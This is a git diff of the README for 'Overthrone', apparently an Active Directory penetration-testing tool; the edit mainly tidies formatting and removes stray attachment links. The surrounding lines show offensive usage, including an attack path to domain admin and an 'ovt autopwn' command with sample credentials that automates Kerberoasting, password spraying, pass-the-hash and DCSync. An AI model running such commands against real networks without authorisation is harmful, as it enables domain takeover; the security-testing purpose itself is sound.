@@ -1,4 +1,3 @@
-﻿```markdown
 <p align="center">
   <img src="assets/overthrone-banner.png" width="700" alt="overthrone banner" />
 </p>
@@ -665,9 +664,10 @@ ovt graph --path-to-da jsmith
 
 # Output:
 # Path 1 (cost: 6, hops: 3):
-#    JSMITH --[MemberOf]--> IT-SUPPORT [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/6492831/1a51ab48-1c84-4d2d-a133-9835e1c1c1a6/runner.rs)
-#    IT-SUPPORT --[GenericAll]--> SVC-BACKUP [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/6492831/7dc6a04e-add6-4887-b145-c859ef3db6a0/mod.rs)
-#    SVC-BACKUP --[AdminTo]--> DC01$
+#   [1] JSMITH --[MemberOf]--> IT-SUPPORT
+#   [2] IT-SUPPORT --[GenericAll]--> SVC-BACKUP
+#   [3] SVC-BACKUP --[AdminTo]--> DC01$
+#
 # Three hops. Three. The CISO will need to sit down.
 
 # Kerberoast SVC-BACKUP (it has an SPN and a password from 2019)
@@ -712,6 +712,7 @@ ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
 
 # Go get coffee. Actually, get two. One for you and one for your impending
 # promotion after the client sees this report.
+#
 # Overthrone will:
 # 1. Enumerate everything
 # 2. Build attack graph
@@ -719,6 +720,7 @@ ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
 # 4. Execute the path (roast, spray, PtH, whatever works)
 # 5. DCSync
 # 6. Generate PDF report
+#
 # Come back to: engagement-report.pdf
 # Time elapsed: less than your coffee order took
 ```
@@ -809,4 +811,3 @@ MIT — use it, modify it, learn from it, build on it. Just don't be evil with i
   <sub>Every throne falls. The question is whether you find out from a pentester or from a ransomware note.</sub><br/>
   <sub>We prefer the first option. Your insurance company does too.</sub>
 </p>
-```
